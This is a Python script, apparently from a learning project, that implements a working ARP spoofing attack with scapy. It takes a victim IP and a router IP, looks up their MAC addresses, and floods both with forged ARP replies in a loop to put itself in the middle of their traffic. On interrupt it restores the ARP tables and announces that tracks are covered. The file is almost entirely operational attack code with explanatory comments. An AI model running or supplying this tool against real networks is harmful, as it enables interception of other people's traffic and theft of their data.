from doctest import FAIL_FAST
from rx import catch
import scapy.all as scapy
import optparse
import sys
import time




def get_arguments():
    parseobj=optparse.OptionParser()
    parseobj.add_option('-v','--victim-ip',dest='vip',help="victim ip address")
    parseobj.add_option('-r','--router-ip',dest='rip',help="router ip")
    options,arguments=parseobj.parse_args()
    if not options.vip and not options.rip:
        print("Please enter required ip addresses...")
    return options

def scan(ip):
    arp_packet=scapy.ARP(pdst=ip) #pdest specifies the ip address of whom we want to find the mac address
    #arp_packet.show()  can be used to see the different fields in the packet to manipulate it if required
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show() again used to find all useful fields of the packet
    arp_broadcast=broadcast/arp_packet #scapy allows for the different  packets to be joined using the / symbol
                    # and note that the packet is now a frame cuz it has a datalink layer wrapping the network layer arp protocol
    answered,unanswered = scapy.srp(arp_broadcast,timeout=1,verbose=False) #timeout is set so that we do not wait on an ip address that does not respond
                                                    # verbose is set to false to remove information that is currently useless to us
                                                    # srp function return two lists of answered and unanswered packets
    # for answer in answered:
    #     print(answer)
    #     print('---------------------------------------') # answered list is a list of pairs containing the original arp message sent and the answered received


    return answered[0][1].hwsrc



def arp_spoofer(vip,rip):
    mac=scan(vip)
    packet=scapy.ARP(op=2,pdst=vip,psrc=rip,hwdst=mac) #here op is set to 2 to tell the ARP module that we are creating arp response, where as 1 is an arp request
    scapy.send(packet,verbose=False)


def clean_exit(vip,rip):
    vmac=scan(vip)
    rmac=scan(rip)
    packet1=scapy.ARP(op=2,pdst=vip,psrc=rip,hwdst=vmac,hwsrc=rmac)
    scapy.send(packet1,verbose=False,count=4)
    packet2=scapy.ARP(op=2,pdst=rip,psrc=vip,hwdst=rmac,hwsrc=vmac)
    scapy.send(packet2,verbose=False,count=4)
    print('Clean Exit complete,,,, Tracks covered......')


options=get_arguments()


try:
    count=0
    while True:
        arp_spoofer(options.vip,options.rip)
        arp_spoofer(options.rip,options.vip)
        count+=2
        print("[+]Packets sent:"+str(count),end="\r"),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    clean_exit(options.vip,options.rip)


